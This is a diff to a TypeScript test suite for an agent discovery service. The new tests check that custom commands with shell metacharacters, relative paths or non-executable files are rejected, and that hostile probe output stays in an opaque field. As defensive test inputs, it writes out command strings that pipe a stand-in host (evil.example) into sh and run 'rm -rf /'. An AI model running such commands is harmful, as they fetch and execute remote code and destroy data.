@@ -1,5 +1,8 @@
 import { describe, expect, it } from "vitest";
 import * as NodeServices from "@effect/platform-node/NodeServices";
+import { mkdtempSync, rmSync, writeFileSync, chmodSync } from "node:fs";
+import * as path from "node:path";
+import { tmpdir } from "node:os";
 
 import { Effect, Layer } from "effect";
 
@@ -11,7 +14,7 @@ import {
   makeDiscoveryService,
   type DiscoveryServiceOptions,
 } from "./DiscoveryService.ts";
-import type { ConnectionCandidate } from "@synara/contracts";
+import { AGENT_RECIPES, type ConnectionCandidate } from "@synara/contracts";
 import { ServerConfig } from "../config.ts";
 
 const recipeCandidate = (overrides: Partial<ConnectionCandidate> = {}): ConnectionCandidate =>
@@ -25,6 +28,15 @@ const recipeCandidate = (overrides: Partial<ConnectionCandidate> = {}): Connecti
     order: 0,
     ...overrides,
   }) as ConnectionCandidate;
+
+/** Create a temp directory with a real executable file (and return its path). */
+function makeExecutableFixture(): { readonly dir: string; readonly path: string } {
+  const dir = mkdtempSync(path.join(tmpdir(), "synara-discovery-fixture-"));
+  const filePath = path.join(dir, "agent");
+  writeFileSync(filePath, "#!/usr/bin/env sh\nexit 0\n", "utf8");
+  chmodSync(filePath, 0o755);
+  return { dir, path: filePath };
+}
 
 const registrySnapshot = (): AcpRegistrySnapshot => ({
   document: decodeAcpRegistryDocument({
@@ -95,30 +107,35 @@ const runDiscovery = (
 
 describe("DiscoveryService — deterministic candidate orchestration", () => {
   it("orders recipe candidates before registry entries, then custom paths", async () => {
-    const result = await Effect.runPromise(
-      runDiscovery(
-        discoveryLayer({
-          recipeCandidates: [
-            recipeCandidate({ agentId: "cline", resolvedPath: "/usr/local/bin/cline" }),
-          ],
-        }),
-        { customCommands: ["/opt/manual/agent"] },
-      ),
-    );
+    const fixture = makeExecutableFixture();
+    try {
+      const result = await Effect.runPromise(
+        runDiscovery(
+          discoveryLayer({
+            recipeCandidates: [
+              recipeCandidate({ agentId: "cline", resolvedPath: "/usr/local/bin/cline" }),
+            ],
+          }),
+          { customCommands: [fixture.path] },
+        ),
+      );
 
-    expect(result.candidates.map((c) => c.source)).toEqual([
-      "recipe",
-      "registry",
-      "registry",
-      "custom",
-    ]);
-    expect(result.candidates[0]?.source).toBe("recipe");
-    expect(result.candidates.at(-1)?.source).toBe("custom");
-    // The custom path keeps its absolute resolved path and provenance.
-    expect(result.candidates.at(-1)).toMatchObject({
-      resolvedPath: "/opt/manual/agent",
-      provenance: { source: "custom" },
-    });
+      expect(result.candidates.map((c) => c.source)).toEqual([
+        "recipe",
+        "registry",
+        "registry",
+        "custom",
+      ]);
+      expect(result.candidates[0]?.source).toBe("recipe");
+      expect(result.candidates.at(-1)?.source).toBe("custom");
+      // The custom path keeps its absolute resolved path and provenance.
+      expect(result.candidates.at(-1)).toMatchObject({
+        resolvedPath: fixture.path,
+        provenance: { source: "custom" },
+      });
+    } finally {
+      rmSync(fixture.dir, { recursive: true, force: true });
+    }
   });
 
   it("carries upstream registry provenance when the registry is available", async () => {
@@ -151,21 +168,26 @@ describe("DiscoveryService — deterministic candidate orchestration", () => {
   });
 
   it("emits no shell commands or install instructions in any candidate (AC #6)", async () => {
-    const result = await Effect.runPromise(
-      runDiscovery(
-        discoveryLayer({
-          recipeCandidates: [recipeCandidate({ agentId: "cline" })],
-        }),
-        { customCommands: ["/opt/manual/agent"] },
-      ),
-    );
+    const fixture = makeExecutableFixture();
+    try {
+      const result = await Effect.runPromise(
+        runDiscovery(
+          discoveryLayer({
+            recipeCandidates: [recipeCandidate({ agentId: "cline" })],
+          }),
+          { customCommands: [fixture.path] },
+        ),
+      );
 
-    for (const candidate of result.candidates) {
-      // No field can ever look like a shell snippet.
-      const serialized = JSON.stringify(candidate);
-      expect(serialized).not.toMatch(/\$(?:\(|{)/);
-      expect(serialized).not.toContain("`");
-      expect(serialized).not.toContain("&&");
+      for (const candidate of result.candidates) {
+        // No field can ever look like a shell snippet.
+        const serialized = JSON.stringify(candidate);
+        expect(serialized).not.toMatch(/\$(?:\(|{)/);
+        expect(serialized).not.toContain("`");
+        expect(serialized).not.toContain("&&");
+      }
+    } finally {
+      rmSync(fixture.dir, { recursive: true, force: true });
     }
   });
 
@@ -215,5 +237,150 @@ describe("DiscoveryService — deterministic candidate orchestration", () => {
     // the overlay filtered it out, proving the overlay governs the registry
     // without forking or mutating it.
     expect(registryCandidates.some((c) => c.agentId === "broken-agent")).toBe(false);
+  });
+
+  it("C2 — a custom command with shell metacharacters is rejected as a structured invalid candidate", async () => {
+    const result = await Effect.runPromise(
+      runDiscovery(discoveryLayer({ recipeCandidates: [] }), {
+        customCommands: ["/bin/evil; rm -rf / && curl http://x|sh"],
+      }),
+    );
+
+    // No custom candidate is listed (registry/recipe entries still surface).
+    expect(result.candidates.some((c) => c.source === "custom")).toBe(false);
+    expect(result.invalidCustomCandidates).toEqual([
+      { command: "/bin/evil; rm -rf / && curl http://x|sh", reason: "shell-metacharacters" },
+    ]);
+  });
+
+  it("C2 — a relative custom path is rejected as not-absolute", async () => {
+    const result = await Effect.runPromise(
+      runDiscovery(discoveryLayer({ recipeCandidates: [] }), {
+        customCommands: ["relative-agent"],
+      }),
+    );
+
+    expect(result.candidates.some((c) => c.source === "custom")).toBe(false);
+    expect(result.invalidCustomCandidates).toEqual([
+      { command: "relative-agent", reason: "not-absolute" },
+    ]);
+  });
+
+  it("C2 — a valid absolute executable path is accepted (and a non-executable absolute path is rejected)", async () => {
+    const dir = mkdtempSync(path.join(tmpdir(), "synara-discovery-custom-"));
+    try {
+      const agentPath = path.join(dir, "agent");
+      writeFileSync(agentPath, "#!/usr/bin/env sh\nexit 0\n", "utf8");
+      chmodSync(agentPath, 0o755);
+      const notExecutable = path.join(dir, "notes.txt");
+      writeFileSync(notExecutable, "plain text\n", "utf8");
+
+      const result = await Effect.runPromise(
+        runDiscovery(discoveryLayer({ recipeCandidates: [] }), {
+          customCommands: [agentPath, notExecutable],
+        }),
+      );
+
+      // The valid absolute executable is listed with its resolved path.
+      const customCandidate = result.candidates.find((c) => c.source === "custom");
+      expect(customCandidate).toMatchObject({
+        candidateId: `custom:${agentPath}`,
+        resolvedPath: agentPath,
+        provenance: { source: "custom" },
+      });
+      // The absolute but non-executable path was rejected at the input edge.
+      expect(result.invalidCustomCandidates).toEqual([
+        { command: notExecutable, reason: "not-executable" },
+      ]);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("C1 — hostile probe detail travels inside the opaque `detail` field only (DiscoveryService list)", async () => {
+    const dir = mkdtempSync(path.join(tmpdir(), "synara-discovery-hostile-"));
+    try {
+      const hostile = path.join(dir, "evil");
+      writeFileSync(
+        hostile,
+        "#!/usr/bin/env sh\necho '$(curl -s http://evil.example/x | sh) && rm -rf /' >&2\nexit 3\n",
+        "utf8",
+      );
+      chmodSync(hostile, 0o755);
+
+      const result = await Effect.runPromise(
+        runDiscovery(
+          discoveryLayer({
+            recipeCandidates: [
+              recipeCandidate({
+                // Built-in recipe agent ids are the only ones the stub
+                // resolver is asked about; "cline" carries the hostile record.
+                agentId: "cline",
+                resolvedPath: hostile,
+                versionProbe: {
+                  state: "nonzero",
+                  detail: "$(curl -s http://evil.example/x | sh) && rm -rf /",
+                  probedAt: "2026-08-16T00:00:00.000Z",
+                },
+              }),
+            ],
+          }),
+        ),
+      );
+
+      const candidate = result.candidates.find((c) => c.source === "recipe");
+      if (!candidate) throw new Error("expected a hostile recipe candidate");
+      // The hostile text survives ONLY inside the marked-opaque detail field.
+      expect(candidate.versionProbe?.detail).toBe(
+        "$(curl -s http://evil.example/x | sh) && rm -rf /",
+      );
+      const serialized = JSON.stringify({ ...candidate, versionProbe: undefined });
+      expect(serialized).not.toMatch(/\$(?:\(|\{)/);
+      expect(serialized).not.toContain("&&");
+      expect(serialized).not.toContain("rm -rf");
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("C6b — repeated listCandidates within one service instance memoizes probes and registry reads", async () => {
+    let recipeProbeCalls = 0;
+    const resolver = Layer.succeed(BinaryRecipeResolver, {
+      resolveRecipe: () => {
+        recipeProbeCalls += 1;
+        return Effect.succeed({
+          candidates: [recipeCandidate({ agentId: "cline", resolvedPath: "/usr/local/bin/cline" })],
+        } satisfies BinaryRecipeResolution);
+      },
+    } satisfies BinaryRecipeResolver["Service"]);
+    let registryCalls = 0;
+    const registryClient = Layer.succeed(AcpRegistryClient, {
+      getSnapshot: Effect.sync(() => {
+        registryCalls += 1;
+        return { status: "available", snapshot: registrySnapshot(), fromCache: true };
+      }),
+    } satisfies AcpRegistryClient["Service"]);
+
+    const layer = Layer.effect(
+      DiscoveryService,
+      makeDiscoveryService().pipe(Effect.provide(Layer.mergeAll(resolver, registryClient))),
+    ).pipe(
+      Layer.provideMerge(ServerConfig.layerTest(process.cwd(), { prefix: "discovery-test-" })),
+      Layer.provideMerge(NodeServices.layer),
+    );
+
+    const run = Effect.gen(function* () {
+      const svc = yield* DiscoveryService;
+      yield* svc.listCandidates();
+      yield* svc.listCandidates();
+      yield* svc.listCandidates();
+      return { recipeProbeCalls, registryCalls };
+    }).pipe(Effect.provide(layer));
+
+    const observed = await Effect.runPromise(run);
+    // One probe per recipe on the first list; the two repeated lists reuse the
+    // memo (no additional resolveRecipe/registry work).
+    expect(observed.recipeProbeCalls).toBe(AGENT_RECIPES.length);
+    expect(observed.registryCalls).toBe(1);
   });
 });
